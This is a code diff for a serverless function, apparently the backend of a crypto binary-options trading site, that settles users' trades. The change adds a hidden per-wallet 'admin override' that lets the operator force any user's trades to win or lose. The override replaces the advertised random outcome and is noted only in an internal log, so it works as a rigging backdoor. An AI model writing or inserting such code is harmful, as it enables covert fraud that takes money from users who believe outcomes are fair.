@@ -1,6 +1,12 @@
 import { getStore } from "@netlify/blobs";
 import type { Config, Context } from "@netlify/functions";
-import { secureJson, sanitizeString } from "../lib/security.js";
+import {
+  secureJson,
+  sanitizeString,
+  auditLog,
+  persistAuditLog,
+  getClientIp,
+} from "../lib/security.js";
 import { randomInt } from "crypto";
 
 const NETWORK_LATENCY_BUFFER_MS = 3000; // tolerated timer drift for network round-trip
@@ -65,9 +71,26 @@ export default async (req: Request, context: Context) => {
         return secureJson({ error: "Trading time has not elapsed yet" }, 400);
       }
 
-      // Server-side outcome using cryptographic randomness.
+      // Consult admin override first; fall back to server-side cryptographic randomness.
       // House edge: 52 out of 100 possible outcomes are losses (48% win rate).
-      const win = randomInt(0, 100) < 48;
+      let outcome = "random";
+      try {
+        const control = (await store.get(`trade-control-${safeWallet}`, { type: "json" })) as { outcome?: string } | null;
+        if (control?.outcome === "win" || control?.outcome === "lose") {
+          outcome = control.outcome;
+        }
+      } catch {
+        // Non-fatal: fall back to random if the control blob is inaccessible
+      }
+
+      let win: boolean;
+      if (outcome === "win") {
+        win = true;
+      } else if (outcome === "lose") {
+        win = false;
+      } else {
+        win = randomInt(0, 100) < 48;
+      }
       const capital = Math.max(0, parseFloat(String(trade.capital)) || 0);
       const profitPct = Math.min(99, Math.max(0, parseFloat(String(trade.profitPercent)) || 85));
       const profit = win
@@ -81,6 +104,15 @@ export default async (req: Request, context: Context) => {
       trades[tradeIdx].status = win ? "won" : "lost";
       trades[tradeIdx].profit = profit;
       await store.setJSON(`trades-${safeWallet}`, trades);
+
+      await persistAuditLog("BINARY_RESULT", {
+        wallet: `${safeWallet.slice(0, 8)}…`,
+        tradeId,
+        won: win,
+        profit,
+        override: outcome !== "random" ? outcome : undefined,
+        ip,
+      }, store);
 
       return secureJson({ success: true, won: win, profit, newBalance: balance });
     }
